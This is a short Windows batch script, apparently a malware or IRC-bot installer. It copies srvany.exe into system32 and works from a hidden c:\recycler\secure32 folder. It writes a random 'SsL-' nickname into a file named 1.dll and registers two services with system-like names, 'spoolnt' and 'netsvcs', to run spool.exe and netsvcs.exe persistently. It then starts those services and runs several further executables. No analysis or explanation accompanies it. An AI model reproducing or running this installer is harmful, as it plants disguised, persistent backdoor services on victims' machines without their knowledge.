@echo off
copy c:\recycler\secure32\srvany.exe %SYSTEMROOT%\system32\srvany.exe /y
cd c:\recycler\secure32
mkdir ftp
mkdir x
echo user_nick SsL-%random% >> 1.dll
instsrv.exe spoolnt %SYSTEMROOT%\system32\srvany.exe
instsrv.exe netsvcs %SYSTEMROOT%\system32\srvany.exe
REG.EXE add HKLM\SYSTEM\CurrentControlSet\Services\spoolnt\Parameters\Application=c:\recycler\secure32\spool.exe
REG.EXE add HKLM\SYSTEM\CurrentControlSet\Services\spoolnt\Parameters\AppParameters=c:\recycler\secure32\spool.ini
REG.EXE add HKLM\SYSTEM\CurrentControlSet\Services\netsvcs\Parameters\Application=c:\recycler\secure32\netsvcs.exe
REG.EXE add HKLM\SYSTEM\CurrentControlSet\Services\netsvcs\Parameters\AppParameters=c:\recycler\secure32\1.dll
net start netsvcs
net start spoolnt
secure32.exe
windows -app
windows -sys
windows -sec
uptime.exe > uptime.txt
disk.exe
system.exe
net start Dns